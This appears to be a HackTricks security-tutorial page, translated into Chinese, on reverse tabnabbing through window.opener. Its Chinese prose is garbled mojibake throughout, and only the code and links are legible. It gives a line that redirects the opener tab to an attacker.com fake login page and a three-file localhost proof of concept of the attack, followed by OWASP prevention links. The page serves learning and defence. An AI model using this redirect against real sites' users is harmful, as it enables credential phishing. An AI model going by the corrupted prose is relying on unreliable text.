<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# æè¿°

åœ¨ä¸€ä¸ª**æ”»å‡»è€…**å¯ä»¥**æ§åˆ¶**ä¸€ä¸ªå°†è¢«å—å®³è€…ç‚¹å‡»çš„å¸¦æœ‰å±æ€§**`target="_blank" rel="opener"`**çš„**`<a`**æ ‡ç­¾çš„**`href`**å‚æ•°çš„æƒ…å†µä¸‹ï¼Œ**æ”»å‡»è€…**å¯ä»¥å°†è¿™ä¸ª**é“¾æ¥**æŒ‡å‘ä¸€ä¸ªç”±ä»–æ§åˆ¶çš„ç½‘ç«™ï¼ˆä¸€ä¸ª**æ¶æ„**çš„**ç½‘ç«™**ï¼‰ã€‚ç„¶åï¼Œä¸€æ—¦**å—å®³è€…ç‚¹å‡»**é“¾æ¥å¹¶è®¿é—®æ”»å‡»è€…çš„ç½‘ç«™ï¼Œè¿™ä¸ª**æ¶æ„**çš„**ç½‘ç«™**å°†èƒ½å¤Ÿé€šè¿‡javascriptå¯¹è±¡**`window.opener`**æ¥**æ§åˆ¶****åŸå§‹**çš„**é¡µé¢**ã€‚\
å¦‚æœé¡µé¢æ²¡æœ‰**`rel="opener"`**ä½†åŒ…å«`target="_blank"`ï¼Œå¹¶ä¸”æ²¡æœ‰`rel="noopener"`ï¼Œå®ƒä¹Ÿå¯èƒ½å­˜åœ¨æ¼æ´ã€‚

æ»¥ç”¨è¿™ç§è¡Œä¸ºçš„å¸¸è§æ–¹å¼æ˜¯é€šè¿‡`window.opener.location = https://attacker.com/victim.html`æ¥**æ›´æ”¹åŸå§‹ç½‘ç«™çš„ä½ç½®**ï¼Œå°†å…¶æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œè¿™ä¸ªç½‘ç«™**çœ‹èµ·æ¥åƒåŸå§‹ç½‘ç«™**ï¼Œå› æ­¤å¯ä»¥**æ¨¡ä»¿**åŸå§‹ç½‘ç«™çš„**ç™»å½•è¡¨å•**å¹¶å‘ç”¨æˆ·ç´¢è¦å‡­æ®ã€‚

ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œç”±äº**æ”»å‡»è€…ç°åœ¨å¯ä»¥æ§åˆ¶åŸå§‹ç½‘ç«™çš„çª—å£å¯¹è±¡**ï¼Œä»–å¯ä»¥ä»¥å…¶ä»–æ–¹å¼æ»¥ç”¨å®ƒæ¥æ‰§è¡Œ**æ›´éšè”½çš„æ”»å‡»**ï¼ˆä¹Ÿè®¸ä¿®æ”¹javascriptäº‹ä»¶ä»¥å°†ä¿¡æ¯ä¼ è¾“åˆ°ç”±ä»–æ§åˆ¶çš„æœåŠ¡å™¨ï¼Ÿï¼‰

# æ¦‚è¿°

## å¸¦æœ‰åå‘é“¾æ¥

å½“æœªä½¿ç”¨é¢„é˜²å±æ€§æ—¶ï¼Œçˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## æ²¡æœ‰åå‘é“¾æ¥

å½“ä½¿ç”¨é¢„é˜²å±æ€§æ—¶ï¼Œçˆ¶é¡µé¢å’Œå­é¡µé¢ä¹‹é—´çš„é“¾æ¥ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## ç¤ºä¾‹ <a href="#examples" id="examples"></a>

åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä»¥ä¸‹é¡µé¢ï¼Œå¹¶ä½¿ç”¨`python3 -m http.server`è¿è¡Œä¸€ä¸ªwebæœåŠ¡å™¨\
ç„¶åï¼Œ**è®¿é—®**`http://127.0.0.1:8000/`vulnerable.htmlï¼Œ**ç‚¹å‡»**é“¾æ¥ï¼Œæ³¨æ„**åŸå§‹**çš„**ç½‘ç«™URL**å¦‚ä½•**æ”¹å˜**ã€‚

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## å¯è®¿é—®çš„å±æ€§ <a href="#accessible-properties" id="accessible-properties"></a>

åœ¨å‘ç”Ÿ**è·¨åŸŸ**è®¿é—®ï¼ˆè·¨ä¸åŒåŸŸï¼‰çš„æƒ…å†µä¸‹ï¼Œæ¶æ„ç«™ç‚¹å¯ä»¥è®¿é—®ç”±**opener** JavaScriptå¯¹è±¡å¼•ç”¨æŒ‡å‘çš„**window** JavaScriptç±»å®ä¾‹çš„å±æ€§ä»…é™äºä»¥ä¸‹å†…å®¹ï¼š

- **`opener.closed`**ï¼šé€šè¿‡è®¿é—®æ­¤å±æ€§ï¼Œå¯ä»¥ç¡®å®šçª—å£æ˜¯å¦å·²å…³é—­ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ã€‚
- **`opener.frames`**ï¼šæ­¤å±æ€§æä¾›å¯¹å½“å‰çª—å£ä¸­æ‰€æœ‰iframeå…ƒç´ çš„è®¿é—®æƒé™ã€‚
- **`opener.length`**ï¼šæ­¤å±æ€§è¿”å›å½“å‰çª—å£ä¸­å­˜åœ¨çš„iframeå…ƒç´ çš„æ•°é‡ã€‚
- **`opener.opener`**ï¼šé€šè¿‡æ­¤å±æ€§å¯ä»¥è·å–å¯¹æ‰“å¼€å½“å‰çª—å£çš„çª—å£çš„å¼•ç”¨ã€‚
- **`opener.parent`**ï¼šæ­¤å±æ€§è¿”å›å½“å‰çª—å£çš„çˆ¶çª—å£ã€‚
- **`opener.self`**ï¼šæ­¤å±æ€§æä¾›å¯¹å½“å‰çª—å£æœ¬èº«çš„è®¿é—®æƒé™ã€‚
- **`opener.top`**ï¼šæ­¤å±æ€§è¿”å›æœ€é¡¶å±‚çš„æµè§ˆå™¨çª—å£ã€‚

ç„¶è€Œï¼Œåœ¨åŸŸç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæ¶æ„ç«™ç‚¹å¯ä»¥è®¿é—®ç”±[**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScriptå¯¹è±¡å¼•ç”¨å…¬å¼€çš„æ‰€æœ‰å±æ€§ã€‚

# é¢„é˜²æªæ–½

é¢„é˜²ä¿¡æ¯å·²è®°å½•åœ¨[HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing)ä¸­ã€‚

# å‚è€ƒ

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)




<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ä¸Šå…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
